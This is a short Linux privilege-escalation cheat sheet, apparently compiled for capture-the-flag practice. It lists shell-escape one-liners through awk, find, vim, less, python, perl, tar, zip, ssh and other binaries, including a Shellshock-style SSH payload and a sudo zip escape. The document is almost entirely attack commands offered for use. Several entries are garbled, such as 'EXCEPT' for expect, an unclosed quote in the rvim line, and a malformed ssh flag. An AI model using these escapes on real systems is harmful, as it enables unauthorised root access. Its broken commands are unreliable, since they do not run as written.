# Linux privilege escalation

## AWK
```
awk 'BEGIN {system("/bin/bash")}'
```


## EXCEPT
```
except spawn sh then sh
```

## FIND
```
find / -name test -exec /bin/sh or /bin/bash \;
```

## FTP
```
!/bin/sh or !/bin/bash
```
## GDB
```
!/bin/sh
!/bin/bash
```

## GIT
```
git help status
!/bin/bash
```

## LUA
```
os.execute('/bin/sh').
```

## MAN / MORE / LESS
```
man man
!sh
```

## PERL
```
perl -e 'exec "/bin/bash";'
```

## PHP
```
php -a then exec("sh -i");
```

## PICO
```
pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T
```


## PYTHON
```
python -c 'import os;os.system("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/sh")'
```

## RUBY
```
exec "/bin/sh"
```
## RVIM
```
:python import os; os.system("/bin/bash )
```

## SCP
```
scp -S /path/yourscript x y:
```

## SSH
```
ssh username@IP - t "/bin/sh" or "/bin/bash"
ssh username@IP -t "bash --noprofile"
ssh username@IP -t "() { :; }; /bin/bash"
sh -o ProxyCommand="sh -c /tmp/ooo.sh" 127.0.0.1
```


## TAR
```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```


## VIM
```
vim
  :set shell=/bin/bash
  :shell

!/bin/sh
!/bin/bash
```

## ZIP
```
sudo -u app-script-ch14-4 zip  /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```
